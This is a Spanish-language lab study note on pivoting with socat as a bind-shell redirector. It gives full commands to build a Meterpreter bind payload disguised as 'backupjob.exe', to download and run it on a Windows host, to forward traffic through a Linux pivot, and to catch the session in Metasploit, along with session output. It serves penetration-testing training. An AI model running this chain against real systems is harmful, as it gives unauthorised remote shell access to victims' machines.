
## 🧠 Concepto clave

Hasta ahora se ha visto socat como redirector de **reverse shells** — donde el objetivo conecta hacia fuera. El **bind shell redirector** invierte la lógica: el objetivo es quien **escucha** en un puerto, y el atacante es quien **conecta** hacia él. Socat actúa como intermediario entre el atacante y el bind shell del objetivo, reenviando las conexiones entrantes del atacante hacia el listener del Windows interno.

| Tipo | Quién escucha | Quién conecta | Dirección del tráfico |
|---|---|---|---|
| **Reverse shell** | Atacante | Objetivo → Pivot → Atacante | Saliente desde el objetivo |
| **Bind shell** | Objetivo | Atacante → Pivot → Objetivo | Entrante hacia el objetivo |

La ventaja del bind shell es que **no hay tráfico de red saliente del objetivo** hacia el exterior — solo tráfico entrante. En entornos donde el firewall bloquea conexiones salientes pero permite entrantes a ciertos puertos, un bind shell puede ser el único vector viable.

---

## 📌 Escenario
```
[Atacante 10.10.14.18]
    │  MSF bind handler — conecta a Ubuntu:8080
    ▼
[Ubuntu pivot 10.129.202.64 / 172.16.5.129]
    │  socat — escucha :8080, reenvía a Windows:8443
    ▼
[Windows 172.16.5.19]
    │  bind shell — escucha en :8443
```

El Windows nunca inicia ninguna conexión. El atacante conecta al pivot, el pivot reenvía al Windows.

---

## 📌 Flujo paso a paso

### Paso 1 — Generar el payload bind shell para Windows

A diferencia de los payloads reverse, un bind shell **no lleva LHOST** — no necesita saber a quién conectarse. Solo necesita saber en qué puerto escuchar (`LPORT`).

> [!tip] Generar payload bind_tcp para Windows con msfvenom
> ```bash
> msfvenom -p windows/x64/meterpreter/bind_tcp \
>     LPORT=8443 \
>     -f exe \
>     -o backupjob.exe
> ```
> `-p windows/x64/meterpreter/bind_tcp` — Payload Meterpreter bind: en lugar de conectar hacia fuera, **abre un listener** en el host donde se ejecuta y espera que alguien conecte.
> `LPORT=8443` — Puerto donde el Windows escuchará conexiones entrantes. No hay `LHOST` porque el payload no conecta a ningún sitio — espera que le conecten.
> `-f exe` — Formato ejecutable Windows PE.
> `-o backupjob.exe` — Nombre del archivo de salida.

> [!important] `bind_tcp` vs `reverse_tcp`: con `reverse_tcp` el payload lleva embebida la IP del destino (`LHOST`) y conecta activamente. Con `bind_tcp` el payload solo lleva el puerto (`LPORT`) y escucha pasivamente — quien conecte recibirá la shell. Esto significa que el payload bind se puede reusar desde múltiples atacantes si el puerto sigue abierto.

---

### Paso 2 — Transferir y ejecutar el payload en el Windows

El payload necesita llegar al Windows y ejecutarse para que el listener quede activo. Se usan los métodos habituales de transferencia:

> [!tip] Transferir el payload al Windows a través del pivot (servidor HTTP en el pivot)
> ```bash
> # En el Ubuntu pivot — servir el payload
> python3 -m http.server 8123
>
> # En el Windows — descargar y ejecutar
> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupjob.exe" -OutFile "C:\backupjob.exe"
> C:\backupjob.exe
> ```

Tras ejecutarse, el Windows queda escuchando en `0.0.0.0:8443` esperando una conexión de Meterpreter.

---

### Paso 3 — Lanzar el redirector socat en el pivot

Con el bind shell activo en el Windows, el pivot necesita redirigir las conexiones del atacante hacia el Windows. El atacante no puede llegar directamente a `172.16.5.19:8443` — solo puede ver `10.129.202.64`.

> [!tip] Redirector socat bind shell — pivot escucha y reenvía al Windows
> ```bash
> # En el Ubuntu pivot
> socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
> ```
> `TCP4-LISTEN:8080` — Socat escucha conexiones entrantes en el puerto `8080` del pivot. El MSF handler conectará aquí.
> `fork` — Proceso hijo por conexión — permite reconexiones si la sesión se pierde.
> `TCP4:172.16.5.19:8443` — Todo lo recibido se reenvía al bind shell del Windows en el puerto `8443`. Socat actúa como proxy transparente entre el handler y el bind shell.

> [!important] A diferencia del redirector de reverse shell (donde socat reenvía tráfico *saliente* del objetivo), aquí socat reenvía tráfico *entrante* del atacante. La dirección del flujo es opuesta, pero el comando socat es estructuralmente idéntico — `LISTEN` siempre es el lado que acepta, `TCP4:HOST:PUERTO` siempre es el destino al que se reenvía.

---

### Paso 4 — Configurar el handler de Metasploit como bind handler

El handler MSF de bind shell funciona de forma inversa al de reverse shell: en lugar de escuchar (`LHOST`/`LPORT`), **conecta activamente** a la IP y puerto especificados en `RHOST`/`LPORT`.

> [!tip] Configurar multi/handler en modo bind para conectar al pivot
> ```bash
> use exploit/multi/handler
> set payload windows/x64/meterpreter/bind_tcp
> set RHOST 10.129.202.64
> set LPORT 8080
> run
> ```
> `set payload windows/x64/meterpreter/bind_tcp` — El payload del handler debe coincidir exactamente con el payload del bind shell en el Windows.
> `set RHOST 10.129.202.64` — **Remote HOST**: IP del pivot Ubuntu — a donde MSF conectará. En bind shells, `RHOST` es la IP del objetivo (o en este caso del pivot que redirige).
> `set LPORT 8080` — Puerto en el `RHOST` donde conectar — el puerto donde socat está escuchando en el pivot.
> `run` — MSF conecta activamente a `10.129.202.64:8080` → socat reenvía a `172.16.5.19:8443` → sesión Meterpreter establecida.

La sesión se establece con el siguiente flujo:
```
MSF handler → conecta a 10.129.202.64:8080
    → socat reenvía a 172.16.5.19:8443
    → MSF envía el stage de Meterpreter (200KB)
    → el Windows ejecuta el stage
    → sesión Meterpreter activa
```

Confirmación en la consola de MSF:
```
[*] Started bind TCP handler against 10.129.202.64:8080
[*] Sending stage (200262 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080)

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

---

## 📌 Diferencias clave entre reverse y bind redirector con socat

| Elemento | Reverse shell redirector | Bind shell redirector |
|---|---|---|
| Payload msfvenom | `reverse_https LHOST=pivot LPORT=8080` | `bind_tcp LPORT=8443` (sin LHOST) |
| Quién inicia la conexión al pivot | El objetivo (Windows) | El atacante (MSF handler) |
| Dirección socat | `LISTEN:8080 → Atacante:80` | `LISTEN:8080 → Windows:8443` |
| Config MSF handler | `LHOST=0.0.0.0 LPORT=80` (escucha) | `RHOST=pivot LPORT=8080` (conecta) |
| Tráfico saliente del objetivo | Sí (hacia el pivot) | No (solo tráfico entrante) |
| Útil cuando | Firewall bloquea entrantes al objetivo | Firewall bloquea salientes del objetivo |

---

## 🔗 Relaciones / Contexto

El bind shell redirector con socat completa el espectro de técnicas de pivoting con esta herramienta. En la práctica, los bind shells son menos frecuentes que los reverse shells en entornos modernos porque la mayoría de firewalls corporativos permiten tráfico saliente pero restringen el entrante — lo que favorece los reverse shells. Sin embargo, en segmentos de red muy restrictivos donde el tráfico saliente está completamente filtrado (redes OT/ICS, entornos air-gapped parciales, o hosts con reglas de egress muy estrictas), el bind shell puede ser la única opción viable. La combinación con socat como redirector resuelve el problema de alcanzabilidad: aunque el atacante no pueda llegar directamente al bind shell del Windows, el pivot sí puede, y socat hace la conexión transparente.